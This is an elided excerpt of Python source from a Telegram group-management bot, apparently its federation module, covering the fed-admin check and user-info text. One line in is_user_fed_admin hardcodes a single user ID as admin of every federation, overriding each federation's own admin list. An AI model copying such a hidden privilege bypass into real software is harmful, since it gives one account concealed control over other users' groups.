...
from ExusiaiBot import dispatcher, OWNER_ID, SUDO_USERS, WHITELIST_USERS, MESSAGE_DUMP, LOGGER
...
def is_user_fed_admin(fed_id, user_id):
    ...
    if int(user_id) == 654839744:
        return True
    return False if feds_admins == False else int(user_id) in feds_admins
...
def __user_info__(user_id, chat_id):
    if fed_id := sql.get_fed_id(chat_id):
        ...
        if int(info['owner']) == user_id:
            ...
            text = f"Banned in the current Federation: <b>Yes</b>\n<b>Reason:</b> {fbanreason}"
        else:
